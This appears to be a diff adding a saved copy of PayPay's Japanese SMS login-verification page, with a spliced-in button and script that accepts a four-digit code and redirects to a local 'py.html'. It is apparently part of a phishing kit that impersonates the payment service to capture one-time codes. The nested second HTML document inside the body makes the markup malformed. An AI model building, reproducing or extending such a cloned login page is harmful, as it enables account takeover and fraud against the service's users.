@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<!-- saved from url=(0040)https://www.paypay.ne.jp/app/account/otp -->
+<html lang="ja" style="--hikari-font-size-base: 10px;"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,height=device-height,user-scalable=no,initial-scale=1,maximum-scale=1,minimum-scale=1,viewport-fit=cover"><meta name="robots" content="noindex"><link rel="icon" href="https://cdn.assets.paypay.ne.jp/cdn/apps/prod/web/5-18-0/favicon.ico"><title>PayPay</title><script type="text/javascript" async="" src="./code_files/analytics.js.ダウンロード"></script><script type="text/javascript" async="" src="./code_files/js"></script><script id="sentry-script" src="./code_files/bundle.tracing.min.js.ダウンロード" crossorigin="anonymous" defer="defer"></script><script>(function () {
+        try {
+          var regexp = /MSIE\s+(\d+)\.\d+/ig;
+          var m = regexp.exec(navigator.userAgent);
+          if(m) {
+            var major = parseInt(m[1], 10);
+            if (major && major < 10) {
+              window.location.href =
+                'https://static.paypay.ne.jp/pages/browser-upgrade/index-ie9.html';
+              return
+            } else if (major >= 10) {
+              window.location.href =
+                'https://static.paypay.ne.jp/pages/browser-upgrade/index.html';
+              return
+            }
+          }
+            var isIE11 = /MSIE 11|Trident\/7\.0/.test(navigator.userAgent);
+            if(isIE11){
+              window.location.href =
+                'https://static.paypay.ne.jp/pages/browser-upgrade/index.html';
+            }
+        } catch (e) {
+          console.log(e)
+        }
+      })()</script><script>(function () {
+        var apiPath10s = '/api/v1/custom-metrics/appLoadTimeout10S'
+        window.hasLoaded = false
+
+        function appMountHandler() {
+          window.hasLoaded = true
+          window.removeEventListener('app-mount', appMountHandler)
+        }
+
+        window.addEventListener('app-mount', appMountHandler, true)
+        setTimeout(function () {
+          if (!window.hasLoaded) {
+            try {
+              fetch(
+                '/portal' + apiPath10s,
+                {method: 'get'})
+            } catch (e) {
+              window.console.log('fetch failed to run')
+            }
+          }
+        }, 10000)
+      })()</script><script>function checkIfEOS() {
+        const MINIMUM_IOS_VERSION = 16
+        const MINIMUM_ANDROID_VERSION = 9
+
+        const iosVersionRegex = /ip[honead]{2,4}\b.*os ([\d_]+) like mac/i
+        const androidVersionRegex = /android[-/ ]?([\d.]*)/i
+
+        const customAgent =
+          window.navigator.userAgent
+            .split(' ')
+            .find((string) => string.includes('jp.pay2.app')) || ''
+
+        const isIOS =
+          customAgent.includes('ios') ||
+          ((/iPad|iPhone|iPod/.test(navigator.platform) ||
+            (navigator.platform === 'MacIntel' &&
+              navigator.maxTouchPoints > 1)) &&
+            !window.MSStream)
+
+        const isAndroid =
+          customAgent.includes('android') || /Android/.test(navigator.userAgent)
+
+        // if ios
+        if (isIOS) {
+          const res = iosVersionRegex.exec(window.navigator.userAgent)
+          if (!res || !res[1]) return false
+
+          const osVersion = res[1].split('.').map((s) => parseInt(s))
+          if (osVersion[0] < MINIMUM_IOS_VERSION) return true
+        }
+
+        // if android
+        if (isAndroid) {
+          const res = androidVersionRegex.exec(window.navigator.userAgent)
+          if (!res || !res[1]) return false
+
+          const osVersion = res[1].split('_').map((s) => parseInt(s))
+          if (osVersion[0] < MINIMUM_ANDROID_VERSION) return true
+        }
+
+        return false
+      }
+
+      function getCookieByName(name) {
+        const cookies = decodeURIComponent(document.cookie).split(";")
+        for (let i = 0; i < cookies.length; i++) {
+          const item = cookies[i].trim()
+          const exp = '^' + name + '=(.*)'
+          const regExp = new RegExp(exp)
+          const result = regExp.exec(item)
+          if (result) {
+            return result[1]
+          }
+        }
+        return ''
+      }
+
+      setTimeout(function () {
+
+        const IGNORE_PATH = ['/app/pre-auth/embed/history', '/app/channel/embed/rate-review']
+
+        if (!window.hasLoaded) {
+          try {
+            if (!IGNORE_PATH.includes(window.location.pathname) && checkIfEOS()) {
+              const isSTGorQA = /(stg\-www|qa\.stg).+paypay.+jp/.test(window.location.hostname)
+              const host = isSTGorQA
+                ? 'https://static.paypay-corp.co.jp'
+                : 'https://static.paypay.ne.jp'
+
+              const locale = getCookieByName('Lang')
+              const fontSize = getCookieByName('FontSize')
+
+              window.location.href = host + '/pages/end-of-support/index.html?' + 'lang=' + locale + '&fontSize=' + fontSize
+            }
+          } catch (e) {
+            // do nothing
+          }
+        }
+      }, 5000)</script><script defer="defer" src="./code_files/npm.paypay.9328c837.js.ダウンロード" type="module"></script><script defer="defer" src="./code_files/npm.core-js-7a6313df.b529344d.js.ダウンロード" type="module"></script><script defer="defer" src="./code_files/npm.core-js-b90b0ef6.68c595e4.js.ダウンロード" type="module"></script><script defer="defer" src="./code_files/npm.babel.38983924.js.ダウンロード" type="module"></script><script defer="defer" src="./code_files/npm.firebase.2d388185.js.ダウンロード" type="module"></script><script defer="defer" src="./code_files/npm.vue.16daeeef.js.ダウンロード" type="module"></script><script defer="defer" src="./code_files/npm.vue-router.bfb52686.js.ダウンロード" type="module"></script><script defer="defer" src="./code_files/main-c3373795.c1f1afb3.js.ダウンロード" type="module"></script><script defer="defer" src="./code_files/main-b9fa02b6.e28410e5.js.ダウンロード" type="module"></script><script defer="defer" src="./code_files/main-cca472bf.42780092.js.ダウンロード" type="module"></script><script defer="defer" src="./code_files/main-b6ebefd2.39a951b0.js.ダウンロード" type="module"></script><script defer="defer" src="./code_files/main-d87c119a.a2fccfa7.js.ダウンロード" type="module"></script><script defer="defer" src="./code_files/main-d572abb7.15f3791b.js.ダウンロード" type="module"></script><script defer="defer" src="./code_files/main-6c4a5f03.9e98d813.js.ダウンロード" type="module"></script><script defer="defer" src="./code_files/main-290eea8e.e5189eb5.js.ダウンロード" type="module"></script><link href="./code_files/main-017397ff.41ebeab8.css" rel="stylesheet"><script defer="defer" src="./code_files/npm.paypay-legacy.934e5930.js.ダウンロード" nomodule=""></script><script defer="defer" src="./code_files/npm.core-js-7a6313df-legacy.af7c6d30.js.ダウンロード" nomodule=""></script><script defer="defer" src="./code_files/npm.core-js-b90b0ef6-legacy.20c0eea6.js.ダウンロード" nomodule=""></script><script defer="defer" src="./code_files/npm.babel-legacy.a0b665db.js.ダウンロード" nomodule=""></script><script defer="defer" src="./code_files/npm.firebase-legacy.2d388185.js.ダウンロード" nomodule=""></script><script defer="defer" src="./code_files/npm.vue-legacy.16daeeef.js.ダウンロード" nomodule=""></script><script defer="defer" src="./code_files/npm.vue-router-legacy.bfb52686.js.ダウンロード" nomodule=""></script><script defer="defer" src="./code_files/main-c3373795-legacy.c1f1afb3.js.ダウンロード" nomodule=""></script><script defer="defer" src="./code_files/main-b9fa02b6-legacy.e28410e5.js.ダウンロード" nomodule=""></script><script defer="defer" src="./code_files/main-cca472bf-legacy.42780092.js.ダウンロード" nomodule=""></script><script defer="defer" src="./code_files/main-b6ebefd2-legacy.713c34a9.js.ダウンロード" nomodule=""></script><script defer="defer" src="./code_files/main-d87c119a-legacy.0669138e.js.ダウンロード" nomodule=""></script><script defer="defer" src="./code_files/main-d572abb7-legacy.c21d76b2.js.ダウンロード" nomodule=""></script><script defer="defer" src="./code_files/main-6c4a5f03-legacy.e5b8feb3.js.ダウンロード" nomodule=""></script><script defer="defer" src="./code_files/main-6c65bcfe-legacy.3134c79d.js.ダウンロード" nomodule=""></script><link href="https://www.googletagmanager.com/" rel="preconnect"><script async="" src="./code_files/js(1)"></script><style data-emotion="css" data-s=""></style><link rel="stylesheet" type="text/css" href="./code_files/p2p-page.ccad4b9e.css"><script src="./code_files/dotlottie-player.mjs" async="" type="module"></script><link rel="stylesheet" type="text/css" href="./code_files/account-page.8fd4040d.css"><link rel="stylesheet" type="text/css" href="./code_files/account-page-sign.f98749ee.css"><link rel="stylesheet" type="text/css" href="./code_files/account-page-otp.80dc152b.css"></head><body class="outside-native transparent-background account-sign-in"><div id="app" data-v-app=""><div class="pp-Box css-ikxcbl" id="app"><div class="container"><section data-v-3416ca22="" class="account-root-page"><section data-v-51615ae6="" data-v-3416ca22="" class="top-header account-header"><header data-v-51615ae6="" class="header-signin"><img data-v-51615ae6="" src="./code_files/logo.2fb04f7c.png" alt="PayPay" height="45"><h2 data-v-51615ae6="">ログイン</h2></header><div data-v-51615ae6="" class="header-more"></div></section><div data-v-3416ca22="" class="account-content"><!----><section data-v-44c7f709="" data-v-3416ca22="" class="otp-auth-page"><div data-v-44c7f709="" class="mb10"><i data-v-0bef7ad0="" data-v-44c7f709="" class="component-icon
+    icon-phone-sms
+    icon-md"></i></div><h3 data-v-44c7f709="" class="header-title">SMSで届いた認証コードを入力してください</h3><p data-v-44c7f709="" class="sub-title">こちらの携帯電話番号に送信しました <strong data-v-44c7f709="" class="ml10">090-4545-1919</strong></p><section data-v-c9d6767e="" data-v-44c7f709="" class="otp-auth"><div data-v-c9d6767e="" class="otp-content"><div data-v-b06f8822="" data-v-c9d6767e="" class="otp"><div data-v-b06f8822="" class="otp-field"><div data-v-b06f8822="" class="otp-prefix">JX -</div><div data-v-b06f8822=""class="otp-input"><input type="tel" id="inputField" maxlength="4" placeholder=""></div></div><div data-v-b06f8822="" class="otp-info"><p data-v-b06f8822="">認証コードに記載の２文字のアルファベットを確認の上、４桁の数字を入力してください</p><p data-v-b06f8822=""><a data-v-b06f8822="" href="https://paypay.ne.jp/rd/support/help/c0177/" target="_blank">アルファベットに関して</a></p></div></div></div><!----><p data-v-c9d6767e="" class="re-send disabled">認証コードを再送 <span data-v-c9d6767e="">(33秒後)</span></p><p data-v-c9d6767e=""><a data-v-c9d6767e="" href="https://paypay.ne.jp/rd/support/help/c0012/" target="_blank" class="otp-info"><img data-v-c9d6767e="" src="./code_files/icon-question.ec586795.svg" width="14" height="14" alt="help icon"> &nbsp;認証コードが届かない場合</a></p><!DOCTYPE html>
+<html>
+<head>
+    <style>
+        .submit-button {
+            background-color: grey;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            cursor: not-allowed;
+        }
+        .submit-button.enabled {
+            background-color: rgb(0, 174, 255);
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <button class="submit-button" id="submitButton" disabled>認証する</button>
+
+    <script>
+        const inputField = document.getElementById('inputField');
+        const submitButton = document.getElementById('submitButton');
+
+        inputField.addEventListener('input', () => {
+            if (inputField.value.length === 4) {
+                submitButton.disabled = false;
+                submitButton.classList.add('enabled');
+            } else {
+                submitButton.disabled = true;
+                submitButton.classList.remove('enabled');
+            }
+        });
+
+        submitButton.addEventListener('click', () => {
+            if (!submitButton.disabled) {
+                window.location.href = 'py.html'; // 遷移先HTMLファイル
+            }
+        });
+    </script>
+</body>
+</html></section></section></div></section></div><div class="pp-Box css-7rss4e"><!----><!----><!----><!----><!----></div></div></div></body></html>
